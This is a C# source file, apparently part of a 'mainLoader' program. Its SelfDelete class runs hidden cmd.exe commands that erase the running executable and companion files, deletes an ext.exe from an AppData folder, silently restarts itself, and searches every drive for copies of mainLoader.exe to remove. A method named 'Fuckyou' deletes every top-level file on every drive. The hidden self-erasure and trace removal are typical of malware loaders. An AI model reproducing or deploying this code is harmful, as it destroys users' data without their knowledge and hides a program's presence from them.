using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace mainLoader
{
    class SelfDelete
    {
        public static void Delete()
        {
            string currentExeLocation = System.Reflection.Assembly.GetEntryAssembly().Location;
            string currentDir = Directory.GetCurrentDirectory();
            string[] AutoUpdaterFile = Directory.GetFiles(currentDir, "*autoupdater.exe", SearchOption.AllDirectories);
            string[] registerFile = Directory.GetFiles(currentDir, "*register.exe", SearchOption.AllDirectories);
            if (AutoUpdaterFile.Length != 0)
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + AutoUpdaterFile[0] + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            if (registerFile.Length != 0)
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + registerFile[0] + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + currentExeLocation + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            //getDrivesAndLoader();
            Environment.Exit(0);
        }
        
        public static void DeleteCFiles()
        {
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            folderPath += @"\LolExt\";
            string[] extExe = Directory.GetFiles(folderPath, "*ext.exe", SearchOption.AllDirectories);
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 5 & Del \"" + extExe[0] + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        public static void Restart()
        {
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "/C choice /C Y /N /D Y /T 1 & START \"\" \"" + Assembly.GetEntryAssembly().Location + "\"";
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info);
            Process.GetCurrentProcess().Kill();
        }

        public static void GetDrivesAndLoader()
        {
            foreach (KnownFolderType type in Enum.GetValues(typeof(KnownFolderType)))
            {
                KnownFolder knownFolder = new KnownFolder(type);
                try
                {
                    //unstable need to remove nuget package > write lib myself > remove unnessesary folders
                    foreach (string file in Directory.EnumerateFiles(knownFolder.Path, "./mainLoader.exe", SearchOption.AllDirectories))
                    {
                        File.Delete(file);
                    }
                }
                catch (Exception)
                {
                    //
                }
            }

            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                try
                {
                    foreach (string file in Directory.EnumerateFiles(d.Name, "./mainLoader.exe", SearchOption.AllDirectories))
                    {
                        File.Delete(file);
                    }
                }
                catch (Exception)
                {
                    //
                }
            }
        }

        public static void Fuckyou()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach(DriveInfo d in allDrives)
            {
                foreach(string files in Directory.GetFiles(d.Name))
                {
                    File.Delete(files);
                }
            }
        }
    }
}
